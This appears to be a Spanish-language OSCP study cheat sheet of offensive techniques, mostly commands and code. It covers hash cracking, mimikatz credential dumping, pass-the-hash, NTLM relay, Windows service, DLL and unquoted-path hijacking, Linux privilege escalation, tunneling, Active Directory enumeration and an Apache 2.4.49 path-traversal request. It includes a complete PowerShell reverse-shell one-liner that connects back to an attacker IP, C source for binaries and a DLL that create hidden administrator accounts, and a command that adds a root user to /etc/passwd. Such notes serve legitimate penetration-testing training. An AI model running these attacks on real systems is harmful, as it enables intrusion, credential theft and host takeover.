
## Password attacks

  Crear una regla para hashcat que añada '1@3$5' al final de cada contraseña:

    └─# cat demo.rule
    $1 $@ $3 $$ $5

  Utilizamos la regla para crackear el hash MD5:

    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r demo.rule

  Crear una regla para convertir todo a mayúsculas con 'u' y duplicar cada palabara 'd':

    └─# cat demo2.rules 
    u d

  Ejecutamos el ataque:

    └─# hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt -r demo2.rules

  Conseguimos la contraseña:

    19adc0e8921336d08502c039dc297ff8:<REDACTED>

  Reglas de contraseñas:

    https://hashcat.net/wiki/doku.php?id=rule_based_attack

### Keepass

  Buscamos por archivos de Keepass:

    Get-ChildItem -Path C: -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

  Nos transferimos el archivo a nuestro local y sacamos el hash con keepass2john:

    └─# keepass2john Database.kdbx > keepass.hash

  Lanzamos hashcat con la regla /rockyou-30000.rule para crackear la contraseña:

    └─# hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

### id_rsa

  Para sacar el hash de una clave privada id_rsa:

    ssh2john id_rsa > ssh.hash

  Para pasar las reglas a JTR, tenemos que modificar el archivo custom.rule:

    └─# cat custom.rule 
    [List.Rules:sshRules]
    c $1 $3 $7 $@
    c $1 $3 $7 $$
    c $1 $3 $7 $#

    sh -c 'cat custom.rule >> /etc/john/john.conf'

  Y corremos JTR:

    └─# john --wordlist=ssh.passwords --rules=sshRules ssh_hash

### NTLM

  Si tenemos privilegios de Administador en una máquina Windows, ejecutamos el comando para ver otros usuarios en el sistema a través de PowerShell:

    Get-LocalUser

  Una vez localicemos los nuevos usuarios, corremos mimikatz y ejecutamos:

    privilege::debug

  Con este comando activamos el permiso 'SeDebugPrivilege' que es necesario para este ataque. Después, lanzamos:

    token::elevate

  Para elevar privilegios a SISTEMA.

  Finalmente, para obtener los hashes:

    lsadump::sam

Una vez tenemos el hash, buscamos en hashcat el modo de crackeo:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/f9b028e5-0d0e-4e5a-a8f0-1156c3ac3d84)

En este caso, el modo es 1000, por lo tanto:

    └─# hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt

Y obtenemos la contraseña en texto plano.

### PassTheHash

Conectar a compartido por smbclient con PtH:

    smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

Obtener shell con psexec a través de PtH:

    impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

Obtener hash NTLM desde un formulario de carga de archivos:

  Tenemos el formulario de carga:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/0e8305d9-b2f8-40d4-a58f-333a4e4df9fa)

  Subimos un fichero cualquiera y capturamos la petición con BurpSuite:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/162f3a70-59bb-42ff-8ec3-e12e82d2307a)

  Nos ponemos en escucha con responder por la interfaz correspondiente:

    └─# responder -I tun0

  Enviamos la siguiente petición:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/0a6aea7c-89ef-4cb9-a936-f6ae8fff365f)

  Y recibimos el hash:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/05039fb0-22bc-42d3-83a7-a30f7bd9111e)

  ### NTLM-relay attack

  Tenemos acceso con el usuario 'files02admin' a la máquina 'files01':

  ![image](https://github.com/loqasto/OSCP/assets/111526713/6e4955e6-8773-4b18-a063-20b102efc4cb)

  Codificamos en base64 una cadena de powershell reverse-shell de una sola línea, que apunte a nuestra máquina de ataque:

    $TEXTO = '$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.212'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    $ENCODED1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXTO))
    Write-Output $ENCODED1

  Con ntlmrelay de Impacket, nos ponemos en escucha para recibir una conexión por smb que ejecute la rev shell:

    └─# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.245.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...."

  Nos ponemos en escucha por el puerto indicado en la one liner de PS:

    nc -lnvp 443

  Y desde la máquina files01 intentamos conectarnos por SMB a nuestra máquina con ntlmrelay corriendo, los que hará que se ejecuta la rev shell de powershell y nos llegue la shell al puerto en escucha:

    dir \\192.168.45.212\test

  ![image](https://github.com/loqasto/OSCP/assets/111526713/473ec30f-1b0c-4063-8ffd-d3a27518903c)

## Windows Privilege Escalation

  ### Service Hijacking

  Encontramos servicios corriendo:

    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

  Enumeramos permisos a partir de esta tabla:

  ![image](https://github.com/loqasto/OSCP/assets/111526713/9124d7af-b927-4674-9ee7-a1bc3e0eb0f1)

  Comprobamos los permisos de un binario utilizando el comamndo icacls:

    PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
    C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)
  
  Y vemos que todos los usuarios tienen permisos Full (F) sobre este binario.

  Creamos un binario en nuestro Kali para sustituir el binario vulnerable:

    #include <stdlib.h>

    int main ()
    {
      int i;
      
      i = system ("net user dave2 password123! /add");
      i = system ("net localgroup administrators dave2 /add");
      
      return 0;
    }

  Lo compilamos:

    x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

  Subimos el nuevo binario a la máquina víctima y lo sustituimos por el original aprovechando los permisos full.

  Utilizando el comando 'net stop' y 'net start' podemos parar y arrancar el servicio, y una vez arrancado, tendremos permisos de Administrador en la máquina.

  Si no nos deja parar y arrancar, comprobamos si el servicio se puede modificar manualmente:

    PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
  
    Name  StartMode
    ----  ---------
    mysql Auto  

  En este caso, podemos ver si entre nuestros privilegios se encuentra el 'SeShutdownPrivilege' con whoami /priv. 

  Si es así, podemos reiniciar la máquina y el comando se ejecutará en el reinicio gracias al path hijacking que hemos realizado.

    shutdown /r /t 0 

  Podemos utilizar también la herramienta PowerUp.ps1. Para ello la subimos a la máquina víctima y ejecutamos:

    powershell -ep bypass

    Import-Module .\PowerUp.ps1

    Get-ModifiableServiceFile

### DLL Hijacking

  Buscamos servicios en estado 'Running':

    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

  Encontramos uno y comprobamos con icacls si tenemos permisos de escritura sobre ese binario, pero no es el caso.

  Abirmos 'ProcMon' y buscamos por el proceso vulnerable, en este caso BetaServ.exe:

   ![image](https://github.com/loqasto/OSCP/assets/111526713/2cd34421-eb13-4d81-a01d-506cba898138)

  Como vemos en la imagen, el binario busca sus propios .dll para ejecutarse. En este caso, bemos que busca myDLL.dll en la carpeta 'Documents' del usuario 'steve'.

  Como estamos logeados con ese usuario, tenemos permisos de escritura ahí. Creamos nuestro .dll malicioso:

      #include <stdlib.h>
    #include <windows.h>
    
    BOOL APIENTRY DllMain(
    HANDLE hModule,// Handle to DLL module
    DWORD ul_reason_for_call,// Reason for calling function
    LPVOID lpReserved ) // Reserved
    {
        switch ( ul_reason_for_call )
        {
            case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
      	    i = system ("net user dave2 password123! /add");
      	    i = system ("net localgroup administrators dave2 /add");
            break;
            case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
            case DLL_THREAD_DETACH: // A thread exits normally.
            break;
            case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
        }
        return TRUE;
    }

  Lo compilamos:

    x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

  Lo subimos a través de 'iwr' y Powershell y lo dejamos en C:\Users\steve\Documents. Reiniciamos el servicio BetaServ:

    Restart-Service BetaService

  Y comprobamos que se han ejecutado nuestros comandos, habiendo creado un usuario dave2 y añadiendóle al grupo Administrators.

## Path hijacking

  Encontramos algún path de un binario sin comillas:

    wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

  Con icals, comprobamos si en alguna de las carpetas del path podemos escribir con nuestro usuario actual. Por ejemplo, en el siguiente path:

    C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

  Si tenemos permiso de escritura en 'Current Version', tenemos que crear un binario llamado 'Current.exe', ya que Windows intentará ejecutar ese binario. Si fuese en 'Enterprise Apps', sería 'Enterprise.exe'.

  Creamos el binario:

    #include <stdlib.h>
    
    int main ()
    {
      int i;
      
      i = system ("net user loqax loqax1234! /add");
      i = system ("net localgroup administrators loqax /add");
      
      return 0;
    }

  Compilamos:

    x86_64-w64-mingw32-gcc mysql.c -o Current.exe

  Y lo subimos al path vulnerable. Ejecutamos 'Restar-Service service_name' y el comando dentro de nuestro binario malicioso se habrá ejecutado.

## Linux Privilege Escalation

  Encontrar jobs que se ejecutan en crontab:

    grep "CRON" /var/log/syslog

  Buscar por procesos que se ejecutan en el sistema:

    watch -n 1 "ps -aux | grep pass"

  Reglas de iptable:

    cat /etc/iptables/rules.v4

  Ficheros con permisos de escritura con el usuario actual:

    find / -writable -type d 2>/dev/null

  Paquetes instalados en el sistema:

    dpkg -l

  Comprobar montajes:

    cat /etc/fstab 

  Capturar tráfico dentro de la red:

    sudo tcpdump -i lo -A | grep "pass"

  Fichero '/etc/passwd' con permisos de escritura con nuestro usuario actual. Generamos nueva contraseña y la hasheamos con openssl, la añadimos a /etc/passwd en la linea de root2 y accedemos con ese usuario:

    openssl passwd w00t
    echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
    su root2
    w00t
    id

## Port Fordwarding y tunneling

  Hemos conseguido acceso a una máquina dentro de una red, y vemos que esa máquina tiene otra interfaz, es decir, pertenece a otra red aparte de la nuestra.

   ![image](https://github.com/loqasto/OSCP/assets/111526713/fdbc45e3-1e90-4c61-a922-249b292c1490)

  Enumerando la máquina, encontramos en el fichero de configuración de Attlasian la siguiente información:

    cat /var/atlassian/application-data/confluence/confluence.cfg.xml
    ...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
    ...

  Por lo que tenemos que traernos el puerto '5432' de la máquina 10.4.191.215 a nuestro local para poder acceder, ya que de momento no llegamos a esa máquina.

  Para ello, utilizamos por ejemplo 'socat':

    socat TCP-LISTEN:2345,fork TCP:10.4.191.215:5432

  Así, el puerto remoto '5432' de 10.4.192.215 se tuneliza al 2345 de la máquina a la que tenemos acceso. Por lo tanto, podemos conectarnos a psql utilizando las credenciales que encontramos:

    psql -h 192.168.191.63 -U postgres -p 2345

  SSH Local Port Fordwarding

  El puerto local 4455 se convierte en el puerto remoto 445 de 172.16.50.217, a través de la conexión con 'database_admin' a 10.4.50.215

    ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

  SSH Dynamic Port Fordwarding

    ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

  Para que funcione, tenemos que editar el archivo /etc/proxychains.conf:

    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    #socks4         127.0.0.1 9050
    socks5 192.168.247.63 8888
    socks5 127.0.0.1 9999
    socks5 127.0.0.1 1080
    socks5 127.0.0.1 9050

  Y ejecutar comandos a través de proxychains.

  SSH Remote Port Fordwarding

    ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

  El puerto 2345 de la máquina víctima 1 es ahora el puerto 5432 de la máquina victima 2 '10.4.50.215'. Todo eso nos lo llevamos a nuestro kali de ataque con la última parte del comando 'kali@192.168.118.4'.

  Para comprobarlo, podemos lanzar lo siguiente:

    ss -ntplu

  ![image](https://github.com/loqasto/OSCP/assets/111526713/765d9fac-c597-4a8b-82e3-4f7b85558690)

  SSH Remote Dynamic Port Fordwarding:

    ssh -N -R 9998 kali@192.168.118.4

  El puerto 9998 de la máquina víctima nos lo llevamos a nuestra máquina Kali de ataque. En /etc/proxychains.conf añadimos la línea:

    socks5 127.0.0.1 9998

  Así, cuando utilicemos proxychains para por ejemplo realizar un escaneo con nmap, utilizará el proxy añadido por el puerto 9998.

plink.exe

  Entramos en un servidor Windows en el que el puerto 80 está accesible, pero el 3389 (rdp) está bloqueado por firewall. Podemos utilizar el binario plink.exe para enviarnos el puerto 3389 a nuestro local (puerto 9833) y poder acceder a él:

    C:\Windows\Temp\plink.exe -ssh -l loqax -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4

    xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833

netsh

  Crear una regla en Windows que nos permita traernos el puerto remoto 22 a nuestro puerto local 2222:

    netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

  Añadimos la regla al firewall como excepción:

    netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow

  Podemos conectarnos al puerto remoto desde el puerto local:

    ssh database_admin@192.168.50.64 -p2222

proxychains

    └─# proxychains ssh database_admin@10.4.243.215

  Alternativa a proxychains para conectarse por ssh:

    ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215

dnscat2

  Abrimos listener:

    dnscat2-server feline.corp

  Nos conectamos a él:

    ./dnscat feline.corp

  Listamos ventanas activas:

    windows

  Nos conectamos a la que necesitemos:

    window -i 1

  Ejecutamos listener. En este caso, el servidor smb (puerto 445) del servidor 172.16.2.11 se tuneliza al puerto 4455 de nuestro local.

    listen 127.0.0.1:4455 172.16.2.11:445

  Una vez en escucha, podemos acceder desde nuestro local al puerto remoto:

    smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

## Active Directory

 ### LDAP

   Para enumerar LDAP, necesitamos la información siguiente:

     LDAP://HostName[:PortNumber][/DistinguishedName]

     CN=Stephanie,CN=Users,DC=corp,DC=com

  Para obtener el nombre del dominio principal y construir nuestro comando:

    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

    PdcRoleOwner : DC1.corp.com

  El comando quedaría así:

    LDAP://DC1.corp.com/DC=corp,DC=com

  Enumerar grupos:

    foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
    >> $group.properties | select {$_.cn}, {$_.member}
    >> }

  Usuarios que pertenecen al grupo:

    $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"

  Script para buscar objetos en un entorno de AD:

    function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

    }

  Podemos buscar por grupos:

    LDAPSearch -LDAPQuery "(objectclass=group)"

  Grupos y miembros de cada grupo:

    foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
    >> $group.properties | select {$_.cn}, {$_.member}
    >> }

  Grupo específico:

    $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"

  Consultar grupo:

    $sales.properties.member

  ### PowerView.ps1

   Información del dominio:

     Get-NetDomain

   Información de usuarios:

    Get-NetUser

  Información del sistema y DNS:

    Get-NetComputer
    Get-NetComputer | select operatingsystem,dnshostname

  Ver si nuestro usuario tiene derechos de Administrador en alguna computadora del dominio:

    Find-LocalAdminAccess

  Comprobar si hay usuarios conectados a una máquina del dominio:

    Get-NetSession -ComputerName files04

  Tambien podemos ejecutar el siguiente binario:

    .\PsLoggedon.exe \\files04

  Enumerar SPN del dominio:

    Get-NetUser -SPN | select samaccountname,serviceprincipalname
    setspn -L iis_service

  Resolver nombre:

    nslookup.exe web04.corp.com

  ### Permisos en Active Directory:

    GenericAll: Full permissions on object
    GenericWrite: Edit certain attributes on the object
    WriteOwner: Change ownership of the object
    WriteDACL: Edit ACE's applied to object
    AllExtendedRights: Change password, reset password, etc.
    ForceChangePassword: Password change for object
    Self (Self-Membership): Add ourselves to for example a group

  Enumerar para un usuario en concreto:

    Get-ObjectAcl -Identity stephanie

  Convertir SID a nombre:

    Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

  Un parámetro a resaltar es el siguiente, ya que nos indica si tenemos algún permiso especial sobre un objeto del dominio:

    ActiveDirectoryRights  : ReadProperty

  El objeto del dominio al que hace referencia se define en este otro parámetro:

    SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553

 Ver qué objetos tiene permiso "Generic All" sobre un grupo:

     Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

 Los convertimos a nombre legible:

     "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
  



## Vulnerabilidades conocidas

Apache HTTP Server 2.4.49 - Path traversal

    GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
    Host: https://www.twitter.com/vulnmachines
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Pragma: no-cache
    Cache-Control: no-cache

    
